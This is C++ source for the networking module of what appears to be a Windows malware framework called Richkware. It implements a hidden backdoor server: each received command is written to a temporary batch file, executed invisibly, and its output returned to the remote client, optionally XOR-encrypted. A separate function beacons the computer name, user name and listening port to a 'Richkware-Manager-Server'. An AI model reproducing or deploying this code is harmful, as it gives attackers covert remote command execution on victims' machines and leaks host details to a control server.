/*
*      Copyright 2016 Riccardo Melioli. All Rights Reserved.
*/

#include "network.h"

Server::Server(const char* encryptionKeyArg) {
    encryptionKey = encryptionKeyArg;
    port = "none";
    hThread = NULL;
    listenSocket = INVALID_SOCKET;

    sta.encryptionKey = encryptionKeyArg;
    sta.ListenSocket = INVALID_SOCKET;
}

Server& Server::operator=(const Server& server) {
    encryptionKey = server.encryptionKey;
    port = server.port;
    hThread = server.hThread;
    listenSocket = server.listenSocket;

    sta.encryptionKey = server.sta.encryptionKey;
    sta.ListenSocket = server.sta.ListenSocket;
    return *this;
}

Network& Network::operator=(const Network& network) {
    encryptionKey = network.encryptionKey;
    server = network.server;
    return *this;
}

Network::Network(const char* encryptionKeyArg) {
    encryptionKey = encryptionKeyArg;
    server = Server(encryptionKeyArg);
}

const char* Network::RawRequest(const char* serverAddress, const char* port,	const char* request) {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL, *ptr = NULL, hints;
    const char* sendbuf = request;
    const int bufferlength = 512;
    char recvbuf[bufferlength];
    int iResult;
    std::string response;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        return "Error";
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(serverAddress, port, &hints, &result);
    if (iResult != 0) {
        WSACleanup();
        return "Error";
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
                               ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            WSACleanup();
            return "Error";
        }

        // Connect to server.
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);
    if (ConnectSocket == INVALID_SOCKET) {
        WSACleanup();
        return "Error";
    }

    // Send an initial buffer
    iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        WSACleanup();
        return "Error";
    }

    // Receive until the peer closes the connection
    do {

        iResult = recv(ConnectSocket, recvbuf, bufferlength, 0);
        if (iResult > 0) {
            // answer
            response.append(recvbuf);
        }
        else if (iResult == 0) {
            // connection closed
        }
        else {
            // error
        }

    } while (iResult > 0);

    // shutdown the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        WSACleanup();
        return "Error";
    }

    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();

    return response.c_str();
}


bool Network::UploadInfoToRichkwareManagerServer(const char * serverAddress, const char* port) {
    const char* serverPort = server.getPort();

    std::string name = getenv("COMPUTERNAME");
    name.append("/");
    name.append(getenv("USERNAME"));

    Device device = Device(name, serverPort);

    std::string deviceStr = "$" + device.getName() + "," + device.getServerPort() + "$";
    //deviceStr = EncryptDecrypt(deviceStr,"5");

    RawRequest(serverAddress, port, ("GET /Richkware-Manager-Server/LoadData?data=" +deviceStr +" HTTP/1.1\r\n"
            "Host: " + serverAddress + "\r\n"+
                                     "Connection: close\r\n"+
                                     "\r\n").c_str());

    return true;
}

const char* Network::ResolveAddress(const char *address) {
    const char* addressIP = "";
    WSADATA wsaData;
    struct hostent *remoteHost;
    char *host_name;
    struct in_addr addr;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    host_name = (char *) address;
    remoteHost = gethostbyname(host_name);
    if (remoteHost != NULL) {
        if (remoteHost->h_addrtype == AF_INET) {
            int i = 0;
            while (remoteHost->h_addr_list[i] != 0) {
                addr.s_addr = *(u_long *) remoteHost->h_addr_list[i++];
                addressIP = inet_ntoa(addr);
                break;
            }
        }
    }
    return addressIP;
}


void Server::Start(const char* portArg, bool encrypted) {
    DWORD dwThreadId;
    port = portArg;

    if (encrypted)
        sta.encryptionKey = encryptionKey;
    else
        sta.encryptionKey = NULL;

    SOCKET listenSocketTmp = INVALID_SOCKET;

    WSADATA wsaData;
    int iResult;

    struct addrinfo *result = NULL;
    struct addrinfo hints;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        //throw 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    // Resolve the server address and port
    iResult = getaddrinfo(NULL, portArg, &hints, &result);
    if (iResult != 0) {
        WSACleanup();
        //throw 1;
    }

    // Create a SOCKET for connecting to server
    listenSocketTmp = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (listenSocketTmp == INVALID_SOCKET) {
        freeaddrinfo(result);
        WSACleanup();
        //throw 1;
    }

    // Setup the TCP listening socket
    iResult = bind(listenSocketTmp, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        freeaddrinfo(result);
        closesocket(listenSocketTmp);
        WSACleanup();
        //throw 1;
    }

    freeaddrinfo(result);

    iResult = listen(listenSocketTmp, SOMAXCONN);
    if (iResult == SOCKET_ERROR) {
        closesocket(listenSocketTmp);
        WSACleanup();
        //throw 1;
    }

    listenSocket = listenSocketTmp;
    sta.ListenSocket = listenSocketTmp;

    hThread = CreateThread(0, 0, &ServerThread,
                           (void*)&sta, 0, &dwThreadId);

}

void Server::Stop() {
    port = "none";

    closesocket(listenSocket);
    WSACleanup();

    DWORD dwExit;
    GetExitCodeThread(hThread, &dwExit);
    TerminateThread(hThread, dwExit);
    //CloseHandle(hThread);
}

HANDLE Server::getHhread() {
    return hThread;
}

const char* Server::getPort() {
    return port;
}

DWORD WINAPI ServerThread(void* arg) {
    const char* encryptionKey = (const char*)((*((ServerThreadArgs*)arg)).encryptionKey);
    SOCKET ListenSocket = (SOCKET)((*((ServerThreadArgs*)arg)).ListenSocket);

    //HANDLE hClientThreadArray[1000];
    SOCKET ClientSocket = INVALID_SOCKET;
    while (true) {
        // Accept a client socket
        ClientSocket = accept(ListenSocket, NULL, NULL);
        if (ClientSocket == INVALID_SOCKET) {
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        } else {
            ClientSocketThreadArgs csa;
            csa.ClientSocket = ClientSocket;
            csa.encryptionKey = encryptionKey;

            //hClientThreadArray[i] =
            CreateThread(0, 0, &ClientSocketThread,(void*)&csa, 0, NULL);
        }
    }
    return 0;
}


DWORD WINAPI ClientSocketThread(void* arg) {
    ClientSocketThreadArgs csta = *((ClientSocketThreadArgs*)arg);
    SOCKET ClientSocket = csta.ClientSocket;
    const char* encryptionKey = csta.encryptionKey;

    const int bufferlength = 512;
    int iResult;

    std::string command;
    int iSendResult;
    char recvbuf[bufferlength];
    int recvbuflen = bufferlength;
    std::size_t posSubStr;
    // write the output of command in a file
    srand((unsigned int)time(0));
    std::stringstream ss;
    ss << rand(); // An integer value between 0 and RAND_MAX

    std::string fileName = ss.str();
    char tmp_path[MAX_PATH];
    GetTempPath(MAX_PATH, tmp_path);
    std::string fileBat = tmp_path;
    fileBat.append(fileName + ".bat");
    std::string fileLog = tmp_path;
    fileLog.append(fileName + ".log");
    // Receive until the peer shuts down the connection

    send(ClientSocket, "\nConnection Established\n",24, 0);

    do {
        iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
        command.append(recvbuf);

        // string decryption
        if (encryptionKey != NULL) command = EncryptDecrypt(command, encryptionKey);

        posSubStr = command.find("\n");
        if (posSubStr != std::string::npos) {

            // erase escape characters
            command.erase(posSubStr);

            std::string commandTmp = command;
            commandTmp.append(" > " + fileLog);
            std::ofstream file(fileBat.c_str());

            if (file.is_open()) {
                for (std::string::iterator it = commandTmp.begin();
                     it != commandTmp.end(); ++it) {
                    file << *it;
                }
                file.close();
            }

            if (ShellExecute(0, "open", fileBat.c_str(), "", 0, SW_HIDE)) {
                // Response
                command.append("  -->  ");
                std::ifstream fileResp(fileLog.c_str());
                std::string s;
                if (fileResp.is_open()) {
                    while (!fileResp.eof()) {
                        getline(fileResp, s);
                        command.push_back('\n');
                        command.append(s);
                    }
                }

                // string encryption
                if (encryptionKey != NULL) command = EncryptDecrypt(command, encryptionKey);

                iSendResult = send(ClientSocket, command.c_str(),
                                   (int)strlen(command.c_str()), 0);
                fileResp.close();

            }
            else {
                iSendResult = send(ClientSocket, "error", 5, 0);
            }
            if (iSendResult == SOCKET_ERROR) {
                closesocket(ClientSocket);
                WSACleanup();
                return 1;
            }
        }
        command = "";
        command.clear();

    } while (iResult > 0);

    // remove tmp files
    remove(fileBat.c_str());
    remove(fileLog.c_str());

    send(ClientSocket, "\nConnection Stopped\n",20, 0);

    // shutdown the connection
    iResult = shutdown(ClientSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        closesocket(ClientSocket);
        WSACleanup();
        return 1;
    }
    return 0;
}

Device::Device(std::string nameArg, std::string serverPortArg) {
    name = nameArg;
    serverPort = serverPortArg;
}

Device& Device::operator=(const Device& device) {
    name = device.name;
    serverPort = device.serverPort;
    return *this;
}

std::string Device::getName() {
    return name;
}

std::string Device::getServerPort() {
    return serverPort;
}

void Device::setName(std::string nameArg) {
    name = nameArg;
}

void Device::setServerPort(std::string serverPortArg) {
    serverPort = serverPortArg;
}
